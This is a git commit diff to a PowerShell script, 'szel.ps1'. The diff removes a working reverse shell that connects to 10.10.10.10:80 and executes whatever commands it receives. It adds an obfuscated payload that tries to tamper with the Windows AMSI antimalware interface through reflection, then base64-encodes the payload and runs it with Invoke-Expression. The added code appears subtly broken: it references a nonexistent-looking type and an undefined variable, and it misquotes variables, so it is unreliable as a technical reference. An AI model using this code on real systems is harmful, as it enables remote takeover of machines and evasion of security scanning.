96cb732ee5d482fe691d2ea4d4b4ceac71d30455
piotrkozowicz <34119197+piotrkozowicz@users.noreply.github.com>
2026-06-12 12:19:32 +0200

    Update szel.ps1

--- szel.ps1
+++ szel.ps1
@@ -1,8 +1,12 @@
-$dozorca = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);
-$potokrzeczny = $dozorca.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $potokrzeczny.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$powrotka = (iex ". { $data } 2>&1" | Out-String ); $powrotka2 = $powrotka + 'PS ' + (pwd).Path + '> ';
-$zwrotka = ([text.encoding]::ASCII).GetBytes($powrotka2);
-$potokrzeczny.Write($zwrotka,0,$zwrotka.Length);
-$potokrzeczny.Flush()};
-$dozorca.Close()
+$payload = @"
+try {
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b = $a.GetField('amsiContext', [System.Reflection.BindingFlags]'Static,NonPublic')
+$c = $b.GetValue($null)
+$d = [System.Management.Automation.AmsiSession]::new($a, $c)
+Invoke-Expression (iex ". { $data } 2>&1" | Out-String )
+} catch {}
+"@
+
+$encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
+Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedPayload)))
